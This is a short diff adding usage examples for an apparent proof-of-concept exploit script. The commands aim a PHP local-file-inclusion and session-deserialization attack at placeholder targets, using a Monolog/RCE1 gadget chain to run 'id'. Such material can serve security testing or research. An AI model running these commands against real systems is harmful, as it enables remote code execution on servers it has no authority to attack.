@@ -1,0 +1,13 @@
+python3 poc.py --remote http://127.0.0.1/index.php --force --serializer php_binary
+LFI + adaptive
+python3 poc.py --remote https://target.example \
+  --gadget-chain Monolog/RCE1 --gadget-cmd 'id' \
+  --lfi-endpoint /index.php --lfi-param file \
+  --session-path '/var/lib/php/sessions/sess_{sid}' \
+  --adaptive-timing --serializer-fallback \
+  --control-url https://clean.example
+gadget
+python3 poc.py --remote https://target.example \
+  --gadget-file ./monolog-rce1.bin \
+  --serializer php_serialize \
+  --control-url https://clean.example
